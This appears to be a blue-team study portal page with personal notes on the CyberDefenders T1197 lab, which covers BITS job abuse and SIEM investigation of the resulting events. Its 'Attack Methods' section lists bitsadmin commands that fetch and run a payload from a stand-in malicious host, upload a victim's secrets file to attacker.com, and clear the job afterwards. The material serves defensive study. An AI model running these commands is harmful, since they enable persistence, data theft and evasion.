@@ -1,0 +1,354 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <title>T1197 Lab (CyberDefenders) | Blue Team Study Portal</title>
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body class="min-h-screen bg-slate-950 text-slate-100 antialiased">
+  <div class="app-shell">
+    <aside class="sidebar">
+    <a class="brand" href="../index.html"><span>BT</span><strong>Blue Team Study Portal</strong></a>
+    <button class="command-button" type="button" id="openCommand">Search / Quick jump <kbd>Ctrl K</kbd></button>
+    <label class="search-box"><span>Search notes</span><input id="globalSearch" type="search" placeholder="Search MITRE, commands, topics"></label>
+    <div id="searchResults" class="search-results" hidden></div>
+    <nav><details class="side-level" open><summary><strong>L1</strong><span>Initial Triage &amp; Fundamentals</span></summary><details class="side-section"><summary>SOC &amp; Incident Response Basics<span>5</span></summary><a class="side-link " href="../pages/soc-essentials.html"><span>SOC Essentials</span><em>0 nodes</em></a><a class="side-link " href="../pages/what-is-incident-response.html"><span>What is Incident Response?</span><em>0 nodes</em></a><a class="side-link " href="../pages/incident-response-cycle.html"><span>Incident Response Cycle</span><em>0 nodes</em></a><a class="side-link " href="../pages/frameworks.html"><span>Frameworks</span><em>5 nodes</em></a><a class="side-link " href="../pages/the-hive.html"><span>The Hive</span><em>0 nodes</em></a></details><details class="side-section"><summary>Operating System &amp; Command Line Basics<span>4</span></summary><a class="side-link " href="../pages/important-windows-directories.html"><span>Important Windows Directories</span><em>0 nodes</em></a><a class="side-link " href="../pages/windows-command-line-tools.html"><span>Windows command-line &amp; tools</span><em>0 nodes</em></a><a class="side-link " href="../pages/intro-to-powershell.html"><span>Intro to PowerShell</span><em>0 nodes</em></a><a class="side-link " href="../pages/linux-cheatsheet.html"><span>Linux CheatSheet</span><em>0 nodes</em></a></details><details class="side-section"><summary>Networking &amp; Web Basics<span>3</span></summary><a class="side-link " href="../pages/network.html"><span>Network</span><em>4 nodes</em></a><a class="side-link " href="../pages/network-defenses.html"><span>Network Defenses</span><em>0 nodes</em></a><a class="side-link " href="../pages/web-fundamentals.html"><span>Web Fundamentals</span><em>0 nodes</em></a></details><details class="side-section"><summary>Initial Triage &amp; Analysis<span>3</span></summary><a class="side-link " href="../pages/phishing-analysis.html"><span>Phishing analysis</span><em>14 nodes</em></a><a class="side-link " href="../pages/phishing-analysis-labs.html"><span>Phishing Analysis Labs</span><em>13 nodes</em></a><a class="side-link " href="../pages/osint.html"><span>OSINT</span><em>0 nodes</em></a></details><details class="side-section"><summary>Tool Familiarity<span>3</span></summary><a class="side-link " href="../pages/logging-fundamentals.html"><span>Logging Fundamentals</span><em>0 nodes</em></a><a class="side-link " href="../pages/siem.html"><span>SIEM</span><em>0 nodes</em></a><a class="side-link " href="../pages/elk-elastic-stack.html"><span>ELK (Elastic Stack)</span><em>0 nodes</em></a></details></details><details class="side-level" ><summary><strong>L1.5</strong><span>Advanced Investigation &amp; Contextualization</span></summary><details class="side-section"><summary>Endpoint &amp; OS Investigation<span>5</span></summary><a class="side-link " href="../pages/windows-event-ids.html"><span>Windows Event IDs</span><em>9 nodes</em></a><a class="side-link " href="../pages/windows-processes.html"><span>Windows processes</span><em>0 nodes</em></a><a class="side-link " href="../pages/windows-security-monitoring.html"><span>Windows Security Monitoring</span><em>4 nodes</em></a><a class="side-link " href="../pages/sysinternals.html"><span>Sysinternals</span><em>0 nodes</em></a><a class="side-link " href="../pages/edr-endpoint-detection-and-response.html"><span>EDR (Endpoint Detection and Response)</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Querying<span>4</span></summary><a class="side-link " href="../pages/splunk.html"><span>Splunk</span><em>0 nodes</em></a><a class="side-link " href="../pages/splunk-filters.html"><span>Splunk Filters</span><em>0 nodes</em></a><a class="side-link " href="../pages/log-analysis-labs.html"><span>Log Analysis Labs</span><em>15 nodes</em></a><a class="side-link " href="../pages/regex.html"><span>Regex</span><em>0 nodes</em></a></details><details class="side-section"><summary>Contextualizing Threats<span>3</span></summary><a class="side-link " href="../pages/threat-intelligence.html"><span>Threat Intelligence</span><em>6 nodes</em></a><a class="side-link " href="../pages/threat-intelligence-labs.html"><span>Threat Intelligence Labs</span><em>18 nodes</em></a><a class="side-link " href="../pages/threat-intelligence-toolkit.html"><span>Threat Intelligence Toolkit</span><em>1 nodes</em></a></details><details class="side-section"><summary>Network Investigation<span>1</span></summary><a class="side-link " href="../pages/network-analysis-tools.html"><span>Network Analysis Tools</span><em>3 nodes</em></a></details></details><details class="side-level" ><summary><strong>L2</strong><span>DFIR, Threat Hunting &amp; Engineering</span></summary><details class="side-section"><summary>Proactive Threat Hunting<span>6</span></summary><a class="side-link " href="../pages/hunting-persistence-mitre-ta0003.html"><span>Hunting Persistence (MITRE TA0003)</span><em>11 nodes</em></a><a class="side-link " href="../pages/hunting-lateral-movement-mitre-ta0008.html"><span>Hunting Lateral Movement (MITRE TA0008)</span><em>4 nodes</em></a><a class="side-link " href="../pages/hunting-discovery-mitre-ta0007.html"><span>Hunting Discovery (MITRE TA0007)</span><em>0 nodes</em></a><a class="side-link " href="../pages/threat-hunting-module.html"><span>Threat Hunting module</span><em>6 nodes</em></a><a class="side-link " href="../pages/threat-hunting-labs-siem.html"><span>Threat hunting Labs (SIEM)</span><em>27 nodes</em></a><a class="side-link " href="../pages/100-splunk-use-cases.html"><span>+100 Splunk Use Cases</span><em>0 nodes</em></a></details><details class="side-section"><summary>Digital Forensics (DFIR)<span>8</span></summary><a class="side-link " href="../pages/digital-forensics.html"><span>Digital Forensics</span><em>9 nodes</em></a><a class="side-link " href="../pages/windows-forensics.html"><span>Windows Forensics</span><em>22 nodes</em></a><a class="side-link " href="../pages/forensics-labs.html"><span>Forensics Labs</span><em>15 nodes</em></a><a class="side-link " href="../pages/memory-forensics.html"><span>Memory forensics</span><em>0 nodes</em></a><a class="side-link " href="../pages/memory-forensics-labs.html"><span>Memory Forensics Labs</span><em>19 nodes</em></a><a class="side-link " href="../pages/volatility.html"><span>Volatility</span><em>5 nodes</em></a><a class="side-link " href="../pages/linux-artifacts-forensic-evidence-collection.html"><span>Linux Artifacts &amp; Forensic Evidence Collection</span><em>7 nodes</em></a><a class="side-link " href="../pages/stenography.html"><span>Stenography</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Attack Vectors &amp; Internals<span>9</span></summary><a class="side-link " href="../pages/active-directory.html"><span>Active Directory</span><em>7 nodes</em></a><a class="side-link " href="../pages/kerberos-authentication.html"><span>Kerberos authentication</span><em>0 nodes</em></a><a class="side-link " href="../pages/detecting-ad-attacks.html"><span>Detecting AD Attacks</span><em>15 nodes</em></a><a class="side-link " href="../pages/detecting-active-directory-attacks-htb.html"><span>Detecting Active Directory Attacks / HTB</span><em>6 nodes</em></a><a class="side-link " href="../pages/windows-internals.html"><span>Windows Internals</span><em>0 nodes</em></a><a class="side-link " href="../pages/command-and-control.html"><span>Command-and-Control (C2)</span><em>0 nodes</em></a><a class="side-link " href="../pages/command-and-control-c2-evasion-techniques.html"><span>Command-and-Control (C2) Evasion Techniques</span><em>0 nodes</em></a><a class="side-link " href="../pages/detecting-web-attacks.html"><span>Detecting Web Attacks</span><em>8 nodes</em></a><a class="side-link " href="../pages/network-analysis-labs.html"><span>Network Analysis Labs</span><em>28 nodes</em></a></details><details class="side-section"><summary>Detection Engineering &amp; Automation<span>6</span></summary><a class="side-link " href="../pages/detection-engineering.html"><span>Detection Engineering</span><em>0 nodes</em></a><a class="side-link " href="../pages/sigma.html"><span>Sigma</span><em>0 nodes</em></a><a class="side-link " href="../pages/yara.html"><span>Yara</span><em>0 nodes</em></a><a class="side-link " href="../pages/atomic-red-team.html"><span>Atomic Red Team</span><em>0 nodes</em></a><a class="side-link " href="../pages/threat-modelling.html"><span>Threat Modelling</span><em>5 nodes</em></a><a class="side-link " href="../pages/ad-hardening.html"><span>AD Hardening</span><em>0 nodes</em></a></details><details class="side-section"><summary>Advanced Scripting &amp; Analysis Tooling<span>6</span></summary><a class="side-link " href="../pages/powershell-for-incident-response.html"><span>PowerShell for Incident Response</span><em>0 nodes</em></a><a class="side-link " href="../pages/powershell-detection.html"><span>Powershell Detection</span><em>0 nodes</em></a><a class="side-link " href="../pages/powershell-logs.html"><span>PowerShell Logs</span><em>0 nodes</em></a><a class="side-link " href="../pages/lolbins-living-off-the-land-binaries.html"><span>LOLBins (living-off-the-land binaries)</span><em>0 nodes</em></a><a class="side-link " href="../pages/osquery.html"><span>Osquery</span><em>0 nodes</em></a><a class="side-link " href="../pages/cryptography.html"><span>Cryptography</span><em>0 nodes</em></a></details></details></nav>
+  </aside>
+    <main class="content"><header class="topic-hero">
+      <div class="breadcrumbs"><a href="../index.html">Home</a><span>/</span><a href="threat-hunting-labs-siem.html">Threat hunting Labs (SIEM)</a><span>/</span><span>T1197 Lab (CyberDefenders)</span></div>
+      <h1>T1197 Lab (CyberDefenders)</h1>
+      <p>Hello these are my notes taken while solving the lab, not a polished writeup. I was practicing for the ECIR exam at the time and plan to revisit the lab to add screenshots and turn this into a full write-up in the future.</p>
+      <div class="tag-row"><span class="tag level">L2</span><span class="tag">SIEM</span><span class="tag">PowerShell</span><span class="tag">Windows</span><span class="tag">Network</span><span class="tag">Detection</span><span class="tag">Persistence</span><span class="tag mitre">T1197</span></div>
+    </header>
+    <div class="reader-layout">
+      <aside class="secondary-nav">
+        <div class="secondary-heading"><span>Current Tree</span><strong>Threat hunting Labs (SIEM)</strong></div>
+        <details class="tree-node" open>
+    <summary>
+      <a class="" href="threat-hunting-labs-siem.html"><span>Threat hunting Labs (SIEM)</span><em>L2</em></a>
+      <b>27</b>
+    </summary>
+    <div class="tree-children"><details class="tree-node" open>
+    <summary>
+      <a class="" href="conti-thm.html"><span>Conti (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="boogeyman3-thm.html"><span>Boogeyman3 (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="servidae-thm.html"><span>Servidae (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="middlemayhem-btlo.html"><span>MiddleMayhem (BTLO)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="hunt-me-i-payment-collectors-thm.html"><span>Hunt Me I Payment Collectors (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="hunt-me-ii-typo-squatters-thm.html"><span>Hunt Me II Typo Squatters (THM)</span><em>L2</em></a>
+      <b>1</b>
+    </summary>
+    <div class="tree-children"><details class="tree-node" >
+    <summary>
+      <a class="" href="summary-report.html"><span>Summary Report</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details></div>
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="phishing-unfolding-thm-soc-simulation.html"><span>Phishing Unfolding THM Soc Simulation</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="splunk-2-thm.html"><span>Splunk 2 (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="slingshot-thm.html"><span>Slingshot (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="new-hire-old-artifacts-thm.html"><span>New Hire Old Artifacts (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="itsybitsy-thm.html"><span>ItsyBitsy (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="benign-thm.html"><span>Benign (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="ps-eclipse-thm.html"><span>PS Eclipse (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="investigating-with-splunk-thm.html"><span>Investigating with Splunk (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="proxylogon-lab-cyberdefenders.html"><span>ProxyLogon Lab (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="kerberoasted-cyberdefenders.html"><span>Kerberoasted (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="t1110-003-lab-cyberdefenders.html"><span>T1110-003 Lab (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="xdr-operation-global-dagger-thm.html"><span>XDR Operation Global Dagger (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="xdr-operation-global-dagger-2-thm.html"><span>XDR Operation Global Dagger 2 (THM)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="falconeye-cyberdefenders.html"><span>FalconEye (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="goldenspray-lab-cyberdefenders.html"><span>GoldenSpray Lab (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="shadowroast-cyberdefenders.html"><span>ShadowRoast (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="revil-lab-cyberdefenders.html"><span>REvil Lab (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="active" href="t1197-lab-cyberdefenders.html"><span>T1197 Lab (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="paloaltorce-lab-cyberdefenders.html"><span>PaloAltoRCE Lab (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="nerisbot-cyberdefenders.html"><span>NerisBot (CyberDefenders)</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details><details class="tree-node" open>
+    <summary>
+      <a class="" href="volt-typhoon.html"><span>Volt Typhoon</span><em>L2</em></a>
+      
+    </summary>
+    
+  </details></div>
+  </details>
+      </aside>
+      <article class="reader">
+        
+        <section class="study-grid">
+    <article><h2>Overview</h2><p>Hello these are my notes taken while solving the lab, not a polished writeup. I was practicing for the ECIR exam at the time and plan to revisit the lab to add screenshots and turn this into a full write-up in the future.</p></article>
+    <article><h2>Why It Matters In SOC</h2><p>Use this note as an analyst reference: understand the concept, identify the relevant telemetry, pivot through evidence, and document the decision path clearly.</p></article>
+    <article><h2>Key Concepts</h2><ul><li>T1197 Lab (CyberDefenders)</li><li>Scenario</li><li>Preliminary Search</li><li>BITS Overview</li><li>How Attackers Abuse BITS for Persistence</li><li>Attack Methods</li><li>BITS-Specific Event IDs</li><li>Detailed Analysis</li><li>Event Code 4688 – New Process Created</li><li>Event Code 3 – Network Connection</li><li>Event Codes 59 &amp; 60 – BITS Activity</li><li>Scheduled Task and Additional Malware Discovery</li></ul></article>
+    <article><h2>Analyst Workflow</h2><ul><li>Identify the user, host, process, network flow, or identity object involved.</li><li>Collect the highest-value logs first and preserve timestamps and assumptions.</li><li>Pivot through related notes, telemetry sources, and MITRE references.</li><li>Document findings, gaps, containment options, and detection improvements.</li></ul></article>
+    <article><h2>Splunk/SIEM Examples</h2><p class="muted">No direct examples extracted.</p></article>
+    <article><h2>Important Commands</h2><p class="muted">No direct examples extracted.</p></article>
+    <article><h2>Tools Used</h2><ul><li>SIEM</li><li>PowerShell</li></ul></article>
+    <article><h2>Notes/Tips</h2><ul><li>Hello these are my notes taken while solving the lab, not a polished writeup. I was practicing for the ECIR exam at the time and plan to revisit the lab to add screenshots and turn this into a full write-up in the future.</li></ul></article>
+  </section>
+        <section class="source-note"><h2>Original Notes</h2><h2 id="t1197-lab-cyberdefenders">T1197 Lab (CyberDefenders)</h2>
+<blockquote>Hello these are my notes taken while solving the lab, not a polished writeup. I was practicing for the ECIR exam at the time and plan to revisit the lab to add screenshots and turn this into a full write-up in the future.</blockquote>
+<blockquote></blockquote>
+<h3 id="scenario">Scenario</h3>
+<p>Adversaries can exploit BITS (Background Intelligent Transfer Service) jobs to persistently execute code and carry out various background tasks. BITS is a COM-exposed, low-bandwidth file transfer mechanism used by applications such as updaters and messengers, allowing them to operate in the background without interfering with other networked applications.</p>
+<p>In this incident, an employee received multiple alerts from Windows Defender indicating the presence of malicious files on their PC. As you arrive at the scene, your goal is to use SIEM to analyze the event logs from the suspicious machine and determine the nature of the events.</p>
+<p><a class="note-link" href="https://cyberdefenders.org/blueteam-ctf-challenges/t1197/">https://cyberdefenders.org/blueteam-ctf-challenges/t1197/</a></p>
+<hr>
+<h3 id="preliminary-search">Preliminary Search</h3>
+<p>Before starting the detailed investigation, I reviewed the fundamentals of BITS.</p>
+<hr>
+<h3 id="bits-overview">BITS Overview</h3>
+<p>Background Intelligent Transfer Service (BITS) is a Windows component used to transfer files asynchronously between a client and a server. It is commonly used for Windows updates, software installations, and other background file transfers. BITS operates as a <strong>system service</strong> and is designed to handle network interruptions gracefully, resuming transfers where they left off.</p>
+<hr>
+<h3 id="how-attackers-abuse-bits-for-persistence">How Attackers Abuse BITS for Persistence</h3>
+<p>Attackers create malicious download or upload tasks that automatically execute their payloads. Since BITS jobs can be scheduled and operate in the background, they provide a stealthy way for adversaries to maintain access to compromised systems.</p>
+<hr>
+<h3 id="attack-methods"><strong>Attack Methods</strong></h3>
+<ol>
+<li><strong>Creating a Malicious BITS Job</strong></li>
+<ul>
+<li>Attackers create a BITS job to download a payload.</li>
+<li><strong>Example:</strong></li>
+</ul>
+</ol>
+<p>``<code>powershell bitsadmin /create backdoorjob bitsadmin /addfile backdoorjob http://malicious-site.com/payload.exe C:\Windows\Temp\payload.exe bitsadmin /resume backdoorjob </code>``</p>
+<ol>
+<li><strong>Executing the Payload via BITS Notification Commands</strong></li>
+<ul>
+<li>BITS can automatically execute the payload after downloading.</li>
+<li><strong>Example:</strong></li>
+</ul>
+</ol>
+<p>``<code>powershell bitsadmin /SetNotifyCmdLine backdoorjob C:\Windows\Temp\payload.exe NULL </code>``</p>
+<ol>
+<li><strong>Using BITS to Schedule Recurrent Execution</strong></li>
+<ul>
+<li>Attackers use hidden BITS jobs to maintain persistence.</li>
+<li>BITS jobs <strong>survive reboots</strong> and execute automatically.</li>
+</ul>
+<li><strong>Uploading Stolen Data via BITS</strong></li>
+<ul>
+<li>Attackers use BITS to <strong>exfiltrate sensitive files</strong>.</li>
+<li><strong>Example:</strong></li>
+</ul>
+</ol>
+<p>``<code>powershell bitsadmin /addfile uploadjob C:\Users\Victim\Documents\secrets.txt http://attacker.com/upload bitsadmin /resume uploadjob </code>``</p>
+<ol>
+<li><strong>Evading Detection</strong></li>
+<ul>
+<li>BITS jobs run under <code>svchost.exe</code>, making them <strong>blend in</strong>.</li>
+<li>Attackers delete history to remove traces.</li>
+<li><strong>Example:</strong></li>
+</ul>
+</ol>
+<p>``<code>powershell bitsadmin /Complete backdoorjob </code>``</p>
+<hr>
+<h3 id="bits-specific-event-ids">BITS-Specific Event IDs</h3>
+<p>Since this lab’s main focus was on BITS, the usual event IDs were not as prominent. Instead, the following BITS-specific event IDs were found:</p>
+<ul>
+<li><strong>Event ID 4</strong> – A <strong>BITS transfer job</strong> was successfully completed.</li>
+<li><strong>Event ID 8</strong> – A <strong>BITS transfer job</strong> was canceled or aborted.</li>
+<li><strong>Event ID 16</strong> – A <strong>BITS job</strong> was successfully paused.</li>
+<li><strong>Event ID 32</strong> – <strong>BITS transfer</strong> is in progress or was successfully restarted.</li>
+<li><strong>Event ID 35</strong> – <strong>BITS transfer</strong> failed due to a network-related issue or other transfer errors.</li>
+<li><strong>Event ID 59</strong> – BITS transfer failure, typically due to network or permission issues.</li>
+<li><strong>Event ID 60</strong> – BITS or security policy setting changes, often related to configuration modifications.</li>
+</ul>
+<hr>
+<h3 id="detailed-analysis">Detailed Analysis</h3>
+<h4 id="event-code-4688-new-process-created">Event Code 4688 – New Process Created</h4>
+<ul>
+<li>Found the process <strong>“<code>bitsadmin.exe</code>”</strong>.</li>
+</ul>
+<ul>
+<li>Although bitsadmin.exe is a legitimate Windows utility, the attacker used it as a LOLBAS (Living Off the Land Binary).</li>
+</ul>
+<ul>
+<li><strong>Determining Malicious Behavior:</strong></li>
+</ul>
+<p>If the process were legitimate, its expected <strong>parent process would be a system service or scheduled task</strong>. However, it was found that <strong>PowerShell is its parent process, which is highly suspicious 💀.</strong></p>
+<hr>
+<h4 id="event-code-3-network-connection">Event Code 3 – Network Connection</h4>
+<ul>
+<li>No significant findings were discovered in event code 3</li>
+</ul>
+<hr>
+<h4 id="event-codes-59-60-bits-activity">Event Codes 59 &amp; 60 – BITS Activity</h4>
+<ul>
+<li>The attacker used BITS to download files. Additionally, an IP address was identified:</li>
+</ul>
+<p><strong>“<code>192.168.190.136</code>”</strong></p>
+<ul>
+<li><strong>Files Downloaded:</strong></li>
+<ul>
+<li><strong>File 1:</strong> <code>R4n50m.exe</code> from <code>http://192.168.190.136/R4n50m.exe</code></li>
+<li><strong>File 2:</strong> <code>test.exe</code> from <code>http://192.168.190.136/test.exe</code></li>
+<li><strong>File 3:</strong> <code>test.exe</code> from <code>http://192.168.190.136/test.exe</code></li>
+</ul>
+<li>The attacker used BITS to download these files to evade detection.</li>
+<li>Querying for <code>R4n50m.exe</code> revealed that Microsoft Antivirus detected it as <code>Trojan:Win32/Meterpreter.O</code>.</li>
+</ul>
+<hr>
+<h4 id="scheduled-task-and-additional-malware-discovery">Scheduled Task and Additional Malware Discovery</h4>
+<ul>
+<li><strong>Scheduled Task Created (Event Code 4698):</strong></li>
+<ul>
+<li>Task Name: <strong>“<code>eviltask</code>”</strong></li>
+<li>Registered by the user: <code>MSEDGEWIN10\IEUser</code></li>
+<li>The task triggers every minute.</li>
+<li>The task will run the command: <code>C:\shell.cmd</code></li>
+</ul>
+</ul>
+<ul>
+<li><strong>Additional Windows Defender Alert (Event Code 1116):</strong></li>
+<ul>
+<li>Malware was located at: <code>C:\ignite.png</code></li>
+<li>Detected as: <code>Trojan:Win32/Meterpreter.O!MTB.</code></li>
+</ul>
+</ul>
+<hr></section>
+      </article>
+      <details class="toc" open><summary>Table of contents</summary><a href="#t1197-lab-cyberdefenders">T1197 Lab (CyberDefenders)</a><a href="#scenario">Scenario</a><a href="#preliminary-search">Preliminary Search</a><a href="#bits-overview">BITS Overview</a><a href="#how-attackers-abuse-bits-for-persistence">How Attackers Abuse BITS for Persistence</a><a href="#attack-methods">Attack Methods</a><a href="#bits-specific-event-ids">BITS-Specific Event IDs</a><a href="#detailed-analysis">Detailed Analysis</a><a href="#event-code-4688-new-process-created">Event Code 4688 – New Process Created</a><a href="#event-code-3-network-connection">Event Code 3 – Network Connection</a><a href="#event-codes-59-60-bits-activity">Event Codes 59 &amp; 60 – BITS Activity</a><a href="#scheduled-task-and-additional-malware-discovery">Scheduled Task and Additional Malware Discovery</a></details>
+    </div>
+    
+    <footer class="pager"><a href="revil-lab-cyberdefenders.html">← REvil Lab (CyberDefenders)</a><a href="paloaltorce-lab-cyberdefenders.html">PaloAltoRCE Lab (CyberDefenders) →</a></footer></main>
+  </div>
+  <div class="lightbox" id="lightbox" hidden><button type="button" aria-label="Close image">×</button><img alt=""></div>
+  <div class="command-palette" id="commandPalette" hidden>
+    <div class="command-panel">
+      <div class="command-head"><strong>Quick jump</strong><button type="button" id="closeCommand">Close</button></div>
+      <input id="commandInput" type="search" placeholder="Search any note, tag, command, or MITRE ID">
+      <div id="commandResults" class="command-results"></div>
+    </div>
+  </div>
+  <script src="../data/json/search-index.js"></script>
+  <script src="../script.js"></script>
+</body>
+</html>
